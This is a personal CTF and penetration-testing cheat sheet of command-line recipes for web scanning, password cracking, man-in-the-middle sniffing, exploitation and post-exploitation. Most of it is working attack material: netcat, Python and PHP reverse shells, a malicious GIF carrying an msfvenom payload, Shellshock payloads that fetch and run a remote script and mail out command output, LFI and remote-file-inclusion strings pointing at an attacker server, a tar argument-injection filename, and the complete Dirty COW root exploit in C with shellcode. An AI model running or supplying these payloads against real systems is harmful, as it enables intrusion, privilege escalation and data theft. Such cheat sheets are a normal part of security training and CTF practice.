# CTF & pentest cheat sheet
----

Find some useful tools, examples and references for basic pentest and CTF challenges.
by `-LBr`


[TOC]



----

# web

#### nikto
- VulnScan specific page or sub page  
`> nikto -h 'url'`

#### curl
- client side url transfer
`> curl -v 'url'`

- url transfer with authentication
`> curl -u 'user:pw' 'url'`

- explore HTTP options
`>curl -v -X OPTIONS 'url'`

- upload data through PUT option
`> curl -v -X PUT -d '@path/to/file.txt' 'url/file.txt'`

- local file inclusion using in 'url' / path traversal 
`> curl 'url'/?page=php://filter/convert.base64-encode/resource=config`

#### dirb
- Scanning for web directories  
`> dirb 'url' -w 'wordlist`

#### wfuzz
- Fuzzing specific website using a directory wordlist 
`> wfuzz -c -z file,/path/to/wordlist.txt --hc 404,301,200 'url/FUZZ'`

#### sqlmap
- Scan url without knowing the exact db backend at higher level and risk
`> sqlmap -u 'url' --cookie='string' --risk 3--level 3 --dbs`

- Dump tables of mysql db 
`> sqlmap --url target_address --cookie 'sting' --dbms mysql --tables --dump`

- Dump specific DB
`> sqlmap -u 'url' --tables -D 'db_name' --dump`

- Dump content from specific Table in DB
`> sqlmap -u 'url' --tables -D 'db_name' -T 'table_name' --dump`

- Scan using a payload and higher level
`> sqlmap -u 'url' --data="data" --level 3 --risk 3 --dbs`

- Delete stored sessions
`> sqlmap --purge-output`

#### mysql
- connect to loacal db with username and pw promt
`> mysql -u user -p`

- select specific database
`mysql> use database;`

- show tables
`mysql> SELECT * FROM database;`

- update table record
`mysql> UPDATE table SET column = 'updated value' WHERE column = 'old_value';`

- dump database
`> mysqldump -u user -p database > dbdump.sql`

#### wpscan
- Brute force wp login using a wordlist
`> wpscan --url 'url' --wordlist 'list.txt' --username 'name'`

- enumerate all plugins, all themes, usernames 
`> wpscan --url 'url' --enumerate ap --enumerate at --enumerate u`

- enumerate all plugins
`> wpscan -u 'url' --enumerate ap`

#### SimpleHTTPServer (comes with python)
- Start simple HTTP Server at Port 8008
`> python -m SimpleHTTPServer 8008`

#### wget
- download content of a web directory
`> wget -r 'url'`


-----

# wordlists & passwords

#### CeWL
- Generate wordlist with spidering 3 levels of the url  
`> cewl -d 3 -e 'url' > /path/to/out.txt`

#### cut
- Cut the first 10 characters  
`> cut -c10- '/path/to/list.tx' > '/path/to/out.txt'`

- cut and select a specific field using delimiter " " (blank space) very useful when piping an output like nmap
`> cut -d " " -f <fieldNo>`

#### sed
- add a string to every line in a 'file'
`> sed -i -e 's/^/'string'/ 'file.txt'`

- replace the last character with nothing
`> sed 's/.$//'`

#### crunch
- create 'file/wordlist with every combination of 'string' from 2-6 characters
`> crunch 2 6 'string' > 'file.txt'`

#### john
- Mix words in wordlist to genreate better dict file 
`> john --wordlist="/path/to/wordlist/ --rules --stdout > /path/to/newwordlist`

- Crack shadow file with usernames and hashed pws 
`> john '/path/to/shadowfile.bak'`

#### fcrackzip
- measuring cracking capability
`> fcrackzip -B`

- cracking 'file.zip' using zip6 and pw length  from 3-9 characters
`> fcrackzip -v -m zip6 -l 3-9 -u 'file.zip'`

- cracking 'file.zip' using wordlist
`> fcrackzip -vuD -p '/path/to/wordlist.txt' 'file.zip'`

#### openssl
- create pw hash for /etc/passwd
`> openssl passwd -1 -salt 'salt' 'password'`

#### hydra
- generic dictionary bruteforce of a target
`> hydra -L userlist -P passlist <target> `

- Webform password crack/brute force:
		- Gather Information using Burpsuite
		- Use submit Form data to customize hydra command:
`> hydra -l user -P passlist 'targetip' http-form-post "/path/page.php:user=^USER^&pass=^PASS^:Bad Login:" -V`

- Crack WebForm alternative way (esp. when getting 200 response)
`> hydra -t 64 -l user -P passlist 'targetip' http-form-post "/path/:user=^USER^&pass=^PASS^:F=Invalid" -V`

- Crack Key without username
`> hydra 'ip' http-form-post -l '' -P 'wordlist' "/pathto/index.php:key=^PASS^:Invalid Key"`

#### patator
- bruteforce webform password/key
`> patator http_fuzz url='url' method=POST body='key=FILE0' 0='path/to/wordlist.txt' follow=1  -x ignore:fgrep='invalid key'`

- bruteforce webform username and pw combination
`> patator http_fuzz url='url' method=POST body='username=COMBO00&password=COMBO01&server=1&target=index.php&lang=en&token=' 0=combos.txt before_urls='url' accept_cookie=1 follow=1 -x ignore:fgrep='Cannot log in' `

#### find / identify hashes
`> findmyhash <hash>`
`> hash-identifier <hash>`

#### hashcat
- benchmark
`> hashcat -b`

#### hex decode
- hex string decode to clear text (for script see /Script section)
`> echo 'string' | xxd -r -p`

#### base64 decode
- base 64 string decode to clear text (for script see /Script section)
`> echo 'string' | base64 --decode`

- decode base64 content of a file
`> cat 'file' | base64 --decode > 'file_decoded'`

#### steghide
- Show information inside picture 
`> steghide --info '/path/to/file'`

- Extract file from picture  
`> steghide --extract -sf 'path/to/stegofile'`

- embed 'file' in image
`> steghide --embed -cf 'coverfile.jpg' -ef 'file'`


-----

# networking

#### nmap
- Service scan testing all tcp ports  
`> nmap -p- -A -T4 'ip'`

- Specific port knocking  
`> nmap -r -Pn -p1,2,... 'ip'`

- Scan udp ports  
`> nmap -p- -sU 'ip'`

- brute force webform with NSE - nmap scripting engine
`nmap --script http-form-brute -p 80 'host'`
https://nmap.org/nsedoc/scripts/http-form-brute.html

#### netdiscover
- discover ip addresses in a specific subnet and keep listening
`> netdiscover -r 'ip/range' -L`

#### netcat
- Connect to 'port'  
`> nc 'ip' 'port'`

- Connect to a UDP 'port'  
`> nc -nvu 'ip' 'port'`

- Listen on 'port'  
`> nc -lvnp 'port'`

- send specific string after connecting
`> echo 'string' | nc 'ip' 'port'`

- execute /bin/bash after established connection (simple reverse shell)
`> nc -lvp <port> -e /bin/bash`

- netcat with -e option (may not be available depending on nc version)  
`> nc -e /bin/sh <ip> <port>`

- alternative way to get a reverse shell in case -e option is not available  
`> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f`

- filetransfer: on the receiving end  
`> nc -l -p <port> > out.file`

- filetransfer: on the sending end  
`> nc -w3 <ip> <port> < file.tosend`

#### netstat
- display network connections:
`> netstat -a`

- display listening connections
`> netstat -anl | grep listen`

- display all established and listen tcp connections
`> netstat -antp`

#### openvpn
- establish vpn connection and open pw protected management port
`>openvpn —config ‘file’ —management ‘ip’ ‘port’ ‘pwfile’`

#### ftp
- connect to ftp server
`> ftp > open > ip`

- copy content from and to using site command
` > site cpfr /path/to/file`
` > site cpto /path/to/file`

#### bridging interfaces
1. add a bridged interface
`> brctl addbr <custom bridge name> `

2. add interfaces to the new bridge
`> brctl addif <bridge name> <dev1 e.g. eth0>`
`> brctl addif <bridge name> <dev2 e.g. at0>`

3. assign ip addresses and bring em up
`> ifconfig <dev1 e.g.eth0> 0.0.0.0 up`
`> ifconfig <dev2 e.g.at0> 0.0.0.0 up`
`> ifconfig <bridge name> <valid ip of dev1> up`

4. enable ip forwarding
`> echo 1 > /proc/sys/net/ipv4/ip_forward`

### MITM attacks
#### sniff traffic between target and gateway using bettercap
`> bettercap –S <spoof method e.g. ARP> –T <target1,target2…n> -G <gateway> -I <interface> --log <logfile>`

#### sniff traffic between targets using arp spoofing with ettercap
`> ettercap –T –w <dumpfile> -M ARP /<target IP>/ /<port>/`


-----

# Exploiting

#### Web delivery exploit [php]
	msf> use exploit/multi/script/web_delivery 
	msf> set target 1 
	msf> set payload python/meterpreter/reverse_tcp 
	msf> set lhost 'host_ip' 
	msf> set lport 'listen_port' 
	msf> exploit
	[*] Run the following command on the target machine:
	php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.1.1.33:8008/vM7VKq8YT'));"
The target post option (e.g. with Burp Repeater or curl): 
`ip=command;*code*&submit=submit` 

#### Web Login SQL/Vuln Testing: [sql]
	ADMIN' OR 1=1#
	' OR '1'='1' --
	' OR '1'='1' ({
	' OR '1'='1' /*
	website.com/users.php?id=1
	and add the /'/ website.com/users.php?id=1'
	if it throws an error you have it

#### Remote File Inclusion [php]
	Look for example like this piece of code:
	Example:
	<?php
	include($dir . "/members.php");
	?>

	Just create a file .members.php on your web server and call the script like this:
	dir=http://my.evilserver.com/

#### Exploitable PHP functions: [php]

	Code Execution:
	require() - reads a file and interprets content as PHP code
	include() - reads a file and interprets content as PHP code
	eval() - interpret string as PHP code
	pregreplace() - if it uses the /e modifier it interprets the replacement string as PHP code
	
	Command Execution:
	exec() - executes command + returns last line of its output
	passthru() - executes command + returns its output to the remote browser
	(backticks) - executes command and returns the output in an array
	shellexec - executes command + returns output as string
	system() - executes command + returns its output (much the same as passthru())
	.can't handle binary data
	popen() - executes command + connects its output or input stream to a PHP file descriptor
	
	File Disclosure:
	fopen() - opens a file and associates it with a PHP file descriptor
	readfile() - reads a file and writes its contents directly to the remote browser
	file() - reads an entire file into an array
	filegetcontents() - reads file into a string

#### Path traversal / LFI
```
	'url'/?page=php://filter/convert.base64-encode/resource=config

    ../../../../../etc/passwd

    Null terminate
	../../../../../etc/passwd%00
    ../../../../../../etc/passwd&=%3C%3C%3C%3C

    URL ENCODING:
	    ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
	..2f..2f..2f..2f..2f..2f..2f..2f..2f2f..2f..2f..2f..2fetc2fpasswd
	2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f6574632f706173737764253030

	IFRAME PATH TRAVERSAL:
	<iframe width="420" height="315" src="../../../../../../../etc/passwd%00" frameborder="0" allowfullscreen> 		</iframe>

```

#### shell shock
bash executes arbitrary commands

- test for vulnerability
`> env x='() { :;}; echo vulnerable' bash -c "echo this is a test"`
or
`> env X='() { (a)=>\' bash -c "echo date"; cat echo`
or
`> bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable, redir_stack"`

- use it on a vulnerable webserver with curl
`> curl -v -H "User-Agent: () { :; }; /bin/cat /etc/passwd>"`

- send an email
`() { :;}; /bin/bash -c \"whoami | mail -s 'example.com l' xxxxxxxxxxxxxxxx@gmail.com`

- ping attacker machine with a single packet an unique payload
`() {:;}; ping -c 1 -p <e.g  cb18cb3f7bca4441a595fcc1e240deb0> <attacker-machine>`

- download remote shell script and clean up after 5 secs
`() { :;}; /bin/bash -c \"/usr/bin/env curl -s http://<attacker ip>/<file>.py > /tmp/clamd_update; chmod +x /tmp/clamd_update; /tmp/clamd_update > /dev/null& sleep 5; rm -rf /tmp/clamd_update\"`

#### convert ImageTragick arbitrary command execution 
Using vulnerability in 'convert' to execute arbitrary commands with privelege:
`> sudo convert 'https://";/bin/bash"' /dev/null`

#### filename for tar execution vuln [sh]
If you want to exucute code with a tar command (e.g. backup cronjob) , rename file to backup as follows:
`'--checkpoint-action=exec=sh file.sh'`

#### dirty cOw privilege escalation
```
/*
* (un)comment correct payload first (x86 or x64)!
* 
* $ gcc cowroot.c -o cowroot -pthread
* $ ./cowroot
* DirtyCow root privilege escalation
* Backing up /usr/bin/passwd.. to /tmp/bak
* Size of binary: 57048
* Racing, this may take a while..
* /usr/bin/passwd overwritten
* Popping root shell.
* Don't forget to restore /tmp/bak
* thread stopped
* thread stopped
* root@box:/root/cow# id
* uid=0(root) gid=1000(foo) groups=1000(foo)
*
* @robinverton 
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

void *map;
int f;
int stop = 0;
struct stat st;
char *name;
pthread_t pth1,pth2,pth3;

// change if no permissions to read
char suid_binary[] = "/usr/bin/passwd";

/*
* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
*/ 
unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sc_len = 177;

/*
* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
  0x89, 0xe1, 0xcd, 0x80
};
unsigned int sc_len = 136;
*/

void *madviseThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        c+=madvise(map,100,MADV_DONTNEED);
    }
    printf("thread stopped\n");
}

void *procselfmemThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int f=open("/proc/self/mem",O_RDWR);
    int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        lseek(f,map,SEEK_SET);
        c+=write(f, str, sc_len);
    }
    printf("thread stopped\n");
}

void *waitForWrite(void *arg) {
    char buf[sc_len];

    for(;;) {
        FILE *fp = fopen(suid_binary, "rb");

        fread(buf, sc_len, 1, fp);

        if(memcmp(buf, sc, sc_len) == 0) {
            printf("%s overwritten\n", suid_binary);
            break;
        }

        fclose(fp);
        sleep(1);
    }

    stop = 1;

    printf("Popping root shell.\n");
    printf("Don't forget to restore /tmp/bak\n");

    system(suid_binary);
}

int main(int argc,char *argv[]) {
    char *backup;

    printf("DirtyCow root privilege escalation\n");
    printf("Backing up %s to /tmp/bak\n", suid_binary);

    asprintf(&backup, "cp %s /tmp/bak", suid_binary);
    system(backup);

    f = open(suid_binary,O_RDONLY);
    fstat(f,&st);

    printf("Size of binary: %d\n", st.st_size);

    char payload[st.st_size];
    memset(payload, 0x90, st.st_size);
    memcpy(payload, sc, sc_len+1);

    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);

    printf("Racing, this may take a while..\n");

    pthread_create(&pth1, NULL, &madviseThread, suid_binary);
    pthread_create(&pth2, NULL, &procselfmemThread, payload);
    pthread_create(&pth3, NULL, &waitForWrite, NULL);

    pthread_join(pth3, NULL);

    return 0;
}
```


#### find files with setuid / setgid / r+w permissions
`> find <directory> -user root -perm -4000 -exec ls -ldb {} \; >/tmp/filename`
or
`> find / -perm +4000 -user root -type f -print`

- find setgid permissions
`> find / -perm +2000 -user root -type f -print`

- find all writable files for current user
`> find / -perm -o+w`

#### gather system information
- get current distribution
`> lsb_release -a`

- get current kernel version
`> uname -r`
or
`> cat /proc/version`


-----

# reverse shells

#### simple netcat reverse shell [sh]
`> nc - lvp <port> -e /bin/bash`

-  alternative way to get a reverse shell in case -e option is not available 
`> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f`

#### reverse shell [py]
	python -c 'import socket,subprocess,os;
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
	s.connect(("lhost",lport));
	os.dup2(s.fileno(),0); 
	os.dup2(s.fileno(),1); 
	os.dup2(s.fileno(),2);
	p=subprocess.call(["/bin/sh","-i"]);'

#### reverse meterpreter shell [php]
	<?php /**/ error_reporting(0); $ip = '10.1.1.1'; 
	$port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); 
	$s_type = 'stream'; } elseif (($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); 
	$s_type = 'stream'; } elseif (($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); 
	$res = @socket_connect($s, $ip, $port); 
	if (!$res) { die(); } $s_type = 'socket'; } else { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); 
	break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); 
	$len = $a['len']; 
	$b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); 
	die();

#### generic meterpreter php reverse shell code [msfvenom]
`msfvenom -p php/meterpreter/reverse_tcp lhost='host_ip' lport='port' -f raw`

#### crate a php reverse shell in a evil gif file for upload
	> echo GIF98 > evil.gif
	> msfvenom -p php/meterpreter/reverse_tcp lhost='ip' lport='port' >> evil.gif´


-----

# General Tools / Unsorted

#### string 
- Show printable characters in files with at least 3 characters:
`> strings -n 3 '/path/to/file1' '/path/to/file2'`

#### grep
- filter certain file extention '.ext' in a 'file'
`cat 'file' | grep '.*\.ext'`


-----

# Metasploit

#### Build msf search index [sh]
	> service postgres start
	> msfdb init 
	> msfdb start
	> msf> db_rebuild_cache

### MSFConsole

#### connect to a msfvenom created exploit [msf]
	msf> use exploit/multi/handler
	msf> show options
	msf> set lhost 'host_ip'
	msf> set lport 'port'
	msf> set payload php/meterpreter/reverse_tcp
	msf> exploit

#### connect to a session [msf]
	msf> sessions -l
	msf> session -i 'id'

#### Spawn a shell [py]
	msf> meterpreter> shell
	> python -c 'import pty; pty.spawn("/bin/bash")'


-----

# scripts

#### generic bash scripts [sh]
	#!/bin/bash
	if ["$1" == ""] // first argument in empty
		then <...>
		else <...>
	fi
	for x in `seq 1 254`; do 
	<...$1.$x> 
	done
#### change user password [py]
	#! /usr/bin/env python
	import os
	import sys
	try:
		os.system('echo "user:pw" | chpasswd')
	except:
		sys.exit()

#### change root pw
	#!/usr/sh
	echo "root:pw" | chpasswd

#### base64 converter [py]
	import base64 while True:
	string = raw_input('B64String: ' ).strip()
	print base64.decodestring(string)^_input

#### hex string converter [py]
	while True:
	string = raw_input('hex string: ' ).strip()
	print string.decode('hex')

#### guake tab script [py]
	# #!/usr/bin/python
	# Script to crate custom guake tabs 
	# by LBr
	import os
	
	# get current Tab number
	scripttab = os.popen('guake -g').read()

	# Create new Tab with custome name
	while True:
	name = raw_input('New Tab Name (q for quit) :')
	if name == 'q':
		break
	else:
		os.system('guake -n k -r' + name)
		os.system('guake -s' + scripttab)

#### Install additional tools for Kali [sh]
	> apt-get install steghide hexchat zbartools meld ftp openvpn iftop nload etherape dict-free exiftool exif irssi lynx openvas bettercap bridge-utils 

#### startup guake with useful tabs [sh]
	guake -n k -r "netdiscover"
	guake -n k -r "nmap"
	guake -n k -r "nc"
	guake -n k -r "curl"
	guake -n k -r "wget"
	guake -n k -r "nikto"
	guake -n k -r "dirb"
	guake -n k -r "wfuzz"
	guake -n k -r "wpscan" --execute-command='wpscan --update'
	guake -n k -r "sqlmap" --execute-command='sqlmap'
	guake -n k -r "base64" --execute-command='python /root/Templates/base64_decode.py'
	guake -n k -r "hex" --execute-command='python /root/Templates/hexconvert.py'
	guake -n k -r "msf console" --execute-command='msfconsole'
	guake -n k -r "msf venom"
	guake -n k -r "cewl"
	guake -n k -r "john"

```
	#!/bin/bash
	# simple automation script for ctf challenges

	# create project
	echo "new project name:"
	read PROJ
	mkdir /root/Desktop/$PROJ
	cd /root/Desktop/$PROJ
	guake -r $PROJ
	service postgresql start
	msfdb init

	# scan network
	echo "networkscan"
	echo "ip range?"
	read RANGE
	echo "netmask?"
	read MASK
	guake -n k -r "netdiscover" -e "netdiscover -r $RANGE/$MASK"

	# select target
	echo "target ip?"
	read IP

	# standart scans on target
	guake -n k -r "nmap" -e "cd /root/Desktop/$PROJ && nmap -p- -A -T4 $IP "
	guake -n k -r "nmap_common" -e "cd /root/Desktop/$PROJ && nmap -p21,22,23,80,111,110,137,138,139,222,443,445,993,1309,1337,3309,8080,3128,4444,5901,3389, $IP"
	guake -n k -r "nikto" -e "cd /root/Desktop/$PROJ && nikto -h http://$IP"
	guake -n k -r "dirb" -e "cd /root/Desktop/$PROJ && dirb http://$IP /usr/share/wordlists/dirb/big.txt"
	guake -n k -r "curl" -e "cd /root/Desktop/$PROJ && curl -v -X PUT http://$IP"
	guake -n k -r "websrv" -e "cd /root/Desktop/$PROJ && python -m SimpleHTTPServer 8000"
	guake -n k -r "msfc" -e "cd /root/Desktop/$PROJ && msfconsole"
```
-----

# Useful links
- http://pentestmonkey.net/cheat-sheet [reverse shells]
- http://teachthe.net/?p=1481 [sql injection]
- http://www.hackingarticles.in/ [pentesting in general]
- https://www.vulnhub.com/ [CTF challenges]
- https://transfer.sh/ [command line file upload]
- https://tools.bartlweb.net/webssh/ [web ssh client / other admin tools]
- https://www.sans.org/security-resources/ [useful tutorials / cheat sheets]
- http://www.w3schools.com/ [learning "web"]
- https://www.python.org/ [help while scripting python]
- https://www.gnu.org/software/bash/manual/bashref.html [bash manual]
- https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/ [/etc/passwd syntax]
- https://gist.github.com/hofmannsven/9164408 [mysql cheatsheet]
- https://null-byte.wonderhowto.com/ [howtos and tutorials]
- https://github.com/lanjelot/patator#usage-examples [patator cheat sheet]
- https://pequalsnp-team.github.io/cheatsheet/steganography-101 [steganography cheat sheet]
- https://dirtbags.net/ctf/tutorial/ [small ctf tutorials]
- http://enigmaco.de/enigma/enigma.html [enigma simulator]
- https://learncryptography.com/ [crypto tutorial]
- https://hackmag.com/security/hacking-mysql-databases-methods-and-tools/ [hack mysql]
- https://retdec.com/decompilation/ [Online decompiler]
- http://ropshell.com/upload [Online binary vulnerability scanner]
- https://www.cybrary.it/ [Online Courses]
